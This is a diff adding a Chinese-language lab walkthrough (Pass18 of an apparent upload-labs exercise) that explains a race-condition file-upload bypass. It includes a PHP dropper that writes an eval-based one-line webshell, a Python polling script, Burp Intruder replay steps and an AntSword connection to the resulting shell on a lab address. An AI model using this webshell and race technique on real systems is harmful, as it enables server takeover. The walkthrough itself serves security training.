@@ -1940,3 +1940,158 @@ if (isset($_POST['submit'])){
 + 双击成功添加的<code>shell</code>，成功<code>getshell</code>
 
 ![Pass17_20](./img/Pass17_20.PNG)
+
+
+
+## Pass18
+
++ 查看提示
+
+![Pass18_1](./img/Pass18_1.PNG)
+
+
+
++ 查看源码，如下
+
+~~~ shell
+$is_upload = false;
+$msg = null;
+
+if(isset($_POST['submit'])){
+    $ext_arr = array('jpg','png','gif');
+    $file_name = $_FILES['upload_file']['name'];
+    $temp_file = $_FILES['upload_file']['tmp_name'];
+    $file_ext = substr($file_name,strrpos($file_name,".")+1);
+    $upload_file = UPLOAD_PATH . '/' . $file_name;
+
+    if(move_uploaded_file($temp_file, $upload_file)){
+        if(in_array($file_ext,$ext_arr)){
+             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
+             rename($upload_file, $img_path);
+             $is_upload = true;
+        }else{
+            $msg = "只允许上传.jpg|.png|.gif类型文件！";
+            unlink($upload_file);
+        }
+    }else{
+        $msg = '上传出错！';
+    }
+}
+~~~
+
+![Pass18_2](./img/Pass18_2.PNG)
+
+​        从源码看，服务器先将上传的文件保存下来，然后将文件的后缀名同白名单对比；如果是<code>jpg</code>、<code>png</code>、<code>gif</code>中的一种就将文件重命名，如果不符的话<code>unlink()</code>函数会删除该文件
+
+​        如果还是上传一个图片马，若网站依旧存在文件包含漏洞还可利用；如果没有文件包含漏洞则只能上传一个<code>php</code>木马解析运行；
+
+​        那怎么搞？上传上去就被删除了还怎么访问；不慌不慌，代码执行过程需要耗费时间了，如果能在上传的一句话木马被删除前访问即可，这个叫条件竞争上传绕过；
+
+​         可利用<code>burp</code>多线程发包，然后不断在浏览器访问<code>webshell</code>会有一瞬间的访问成功；
+
+
+
++ 编写一句话木马脚本
+
+~~~ php
+<?php
+    fputs(fopen('AttackScript.php','w'),'<?php @eval($_POST["EighteenSecond"])?>'); 
+?>
+~~~
+
+把该<code>php</code>文件通过<code>burpsuite</code>不停重放，然后再写<code>python</code>脚本不停访问上传的文件，总有一瞬间是还没来得及删除就可被访问到，一旦访问到该文件就会在当前目录下生成一个<code>AttackScript.php</code>的一句话。正常渗透测试中这也是好办法，因为单纯访问带有<code>phpinfo()</code>的文件没什么效果，一旦删除还是无法利用；但这办法生成的<code>AttackScript.php</code>服务器不删除，可用蚁剑连接
+
+![Pass18_14](./img/Pass18_14.PNG)
+
+
+
++ 编写访问脚本<code>AttackScript.py</code>
+
+~~~ python
+import requests
+url = "http://192.168.31.126:8080/upload-labs/upload/EighteenSecondMethod.php"
+while True:
+    response = requests.get(url)
+    if response.status_code == 200:
+        print("ok")
+        break
+~~~
+
+![Pass18_19](./img/Pass18_19.PNG)
+
+
+
++ 上传<code>php</code>文件并用<code>burpsuite</code>拦截
+
+![Pass18_5](./img/Pass18_5.PNG)
+
+![Pass18_6](./img/Pass18_6.PNG)
+
+
+
++ 进行下一步操作前不要把<code>burpsuite</code>的拦截功能关闭了，要一直保持拦截状态以达到测试更好的效果；然后将上传的脚本发到测试器
+
+![Pass18_7](./img/Pass18_7.PNG)
+
+
+
++ 配置下测试器，点击下<code>$清除</code>
+
+![Pass18_8](./img/Pass18_8.png)
+
+
+
++ 设置无限发送空的<code>payload</code>让其一直上传该文件
+
+![Pass18_9](./img/Pass18_9.PNG)
+
+
+
++ 把线程设置得高一点做到高并发
+
+![Pass18_10](./img/Pass18_10.png)
+
+
+
++ 点击<code>开始攻击</code>不断地发送<code>payload</code>
+
+![Pass18_11](./img/Pass18_11.png)
+
+![Pass18_12](./img/Pass18_12.PNG)
+
+可以看到上传该文件的数据包不停地重放
+
+
+
++ BP攻击的同时我们也运行<code>python</code>脚本<code>AttackScript.py</code>，目的是不停访问<code>EighteenSecondMethod.php</code>直到成功访问到为止，当出现`OK`说明访问到了该文件，那么<code>AttackScript.php</code>应该也创建成功了
+
+![Pass18_13](./img/Pass18_13.PNG)
+
+
+
++ 将<code>burpsuite</code>的拦截功能解除
+
+![Pass18_15](./img/Pass18_15.png)
+
+
+
++ 用蚁剑添加数据并配置，这里的<code>url</code>是<code>http://192.168.31.126:8080/upload-labs/upload/AttackScript.php</code>，连接密码是<code>EighteenSecond</code>
+
+![Pass18_16](./img/Pass18_16.png)
+
+
+
++ 成功添加了<code>shell</code>
+
+![Pass18_17](./img/Pass18_17.PNG)
+
+
+
++ 双击数据后成功<code>getshell</code>
+
+![Pass18_18](./img/Pass18_18.PNG)
+
+
+
+## Pass19
+
